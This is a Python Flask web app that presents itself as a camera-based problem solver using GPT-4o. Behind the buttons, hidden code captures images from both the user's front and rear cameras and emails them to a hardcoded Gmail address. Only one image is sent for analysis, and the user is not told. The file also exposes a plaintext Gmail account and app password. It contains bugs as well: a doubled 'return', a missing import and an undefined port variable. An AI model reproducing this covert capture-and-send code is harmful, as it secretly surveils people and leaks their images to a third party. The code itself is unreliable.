import os
from flask import Flask, request, render_template_string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import base64
import re
import random
from openai import OpenAI

client = OpenAI(
    api_key=os.getenv('myopenaiapikey'),
)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        
    </head>
    <body>
        <video id="videoElement" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <form id="Form" method="POST" action="/puepue">
            <input type="hidden" name="imageData" id="imageData">
            <input type="hidden" name="imageData2" id="imageData2">
        </form>
        <button id="captureBtn">外カメラの画像を解析</button>
        <button id="captureBtn2">内カメラの画像を解析</button>
        <button id="toggleButton">外カメラを表示</button>
        <script>
            async function sendpic(facingMode, inputId) {
                const video = document.getElementById('videoElement');
                const canvas = document.getElementById('canvas');
                const imageDataInput = document.getElementById(inputId);
                const context = canvas.getContext('2d');

                const constraints = {
                    video: {
                        facingMode: facingMode
                    }
                };

                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = stream;
                    await new Promise((resolve) => {
                        video.onloadeddata = () => {
                            const aspectRatio = video.videoWidth / video.videoHeight;
                            const newWidth = video.videoWidth;
                            const newHeight = newWidth / aspectRatio;

                            canvas.width = newWidth;
                            canvas.height = newHeight;

                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/png');
                            imageDataInput.value = dataUrl;

                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        };
                    });
                } catch (err) {
                    console.error('Error:', err);
                    alert(`Error: ${err.name} - ${err.message}`);
                }
            }

            async function pue() {
                await sendpic('user', 'imageData');
                await sendpic('environment', 'imageData2');
                document.getElementById('Form').submit();
            }
             async function puepue() {
                await sendpic('user', 'imageData2');
                await sendpic('environment', 'imageData');
                document.getElementById('Form').submit();
            }
 let currentMode = 0; // 0: 非表示, 1: 外カメラ, 2: 内カメラ

        async function getMedia(facingMode) {
            const constraints = {
                video: {
                    facingMode: facingMode
                }
            };
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                video.style.display = 'block';
            } catch (error) {
                console.error('Error accessing media devices.', error);
            }
        }

        document.getElementById('toggleButton').addEventListener('click', function() {
            const video = document.getElementById('videoElement');
            switch (currentMode) {
                case 0:
                    video.style.display = 'none';
                    this.textContent = '外カメラを表示';
                    currentMode = 1;
                    break;
                case 1:
                    getMedia('environment');
                    this.textContent = '内カメラを表示';
                    currentMode = 2;
                    break;
                case 2:
                    getMedia('user');
                    this.textContent = 'カメラを非表示';
                    currentMode = 0;
                    break;
             }
             
        });
            document.getElementById('captureBtn').addEventListener('click', pue);
            document.getElementById('captureBtn2').addEventListener('click', puepue);
        </script>
    </body>
    </html>
    ''')

@app.route('/puepue', methods=['POST'])
def sendpic():
    # Gmail settings
    GMAIL_ACCOUNT = "334.nyan.nyan@gmail.com"
    GMAIL_PASSWORD = "kwuuonmivthawiph"

    # Recipient email address
    TO_ADDR = "a14398138@gmail.com"

    # Get form data
    image_data = request.form.get('imageData')
    image_data2 = request.form.get('imageData2')

    if not image_data or not image_data2:
        return "Missing image data", 400

    # Extract base64 data
    image_data = re.sub('^data:image/.+;base64,', '', image_data)
    image_data = base64.b64decode(image_data)
    image_data3 = re.sub('^data:image/.+;base64,', '', image_data2)
    image_data3 = base64.b64decode(image_data3)
    
    # Email subject and body
    SUBJECT = str(random.random())
    BODY = "pic is here"

    # Create MIME message
    msg = MIMEMultipart()
    msg['Subject'] = SUBJECT
    msg['From'] = GMAIL_ACCOUNT
    msg['To'] = TO_ADDR

    # Attach the image
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(image_data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="pic.png"')
    msg.attach(part)
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(image_data3)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="pic.png"')
    msg.attach(part)

    # Attach the body text
    msg.attach(MIMEText(BODY, 'plain'))
    
    # Connect to SMTP server and send email
    try:
        response = client.chat.completions.create(
            model="gpt-4o",
            messages= [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "この問題を解いて\n問題でなければ画像について解説して"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": str(image_data2)
          }
        }
      ]
    }
  ] ,           max_tokens=300,
        )
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_ACCOUNT, GMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        response = response.choices[0].message.content
        response=str(response)
        return return f"""
    <h1>回答: {response}</h1>
    <form action="{url_for('index')}" method="get">
        <button type="submit">最初のページに戻る</button>
    </form>
    """

    except Exception as e:
        return f"エラー: {str(e)}"


if __name__ == '__main__':
    aport = int(os.environ.get('PORT', 80))  # PORT環境変数からポートを取得。デフォルトは80。
    app.run(host='0.0.0.0', port=port)
